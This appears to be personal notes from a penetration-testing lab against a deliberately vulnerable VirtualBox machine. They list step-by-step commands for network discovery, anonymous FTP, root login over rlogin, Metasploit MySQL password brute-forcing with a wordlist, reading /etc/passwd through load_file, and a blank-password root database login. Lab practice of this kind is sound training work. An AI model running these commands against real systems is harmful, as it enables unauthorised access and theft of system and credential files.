Before we start anything download rsh-client
	sudo apt-get install rsh-client
	Now we are ready to do some damage
First do an internal network with Virtual Box
do a sudo netdiscover -i (interface such as eth2)
no do an NMAP, a bunch of stuff is going to be found, lets hack this guy like crazy using metasploit!!!
	sudo nmap -p- -sC -sV -vv -A -O -Pn 10.10.10.4
We see port 21 open (FTP) lets try anonymous login
	that works, first job done!
Lets move to port 512, 513, and 514, remote shell port, if configured incorrectly we can use the rsh-client we just downloaded
	rlogin -l root 10.10.10.4
	We are in again!!!
Lets move to port 3306 MySQL
	The version is 5.0.51a
	We can use auxiliary/scanner/mysql/mysql_login
	show options
		set rhosts is the only thing that is required that does not have a default value
		to execute this attack we do need a wordlist
			set pass_file /usr/share/wordlists/rockyou.txt
			set threads 1000
			set stop_on_success
			set username root (it is default)
			set blank_password true
		lets run this exploit
			we immediantely find there is no password and the username is root
			now lets exploit it and gain root access
			search mysql
				auxiliary/admin/mysql/mysql_sql 
				set password ''
				set username root
				set rhosts
				set sql select load_file('/etc/passwd') 
				set rport 3306
		now lets enumarate the users
			use auxiliary/admin/mysql/mysql_enum
			show options
			set password ''
			set rhosts 
			set rport 3306
			set username root
		Since we already have root password we really didn't need to do the above
			with a large database with many differnet users we may have all users and passwords when dumping this file
	Now lets actually login to mysql back on a regular console
		mysql -u root -p -h 10.10.10.4 (we can see that there is not anything behind -p because the password is blank)
		When asked for password just hit enter
		we are in
			show databases;
			use information_schema;
			show tables;
			describe _______;
			show databases dvwa;
			use users;
			describe _______;
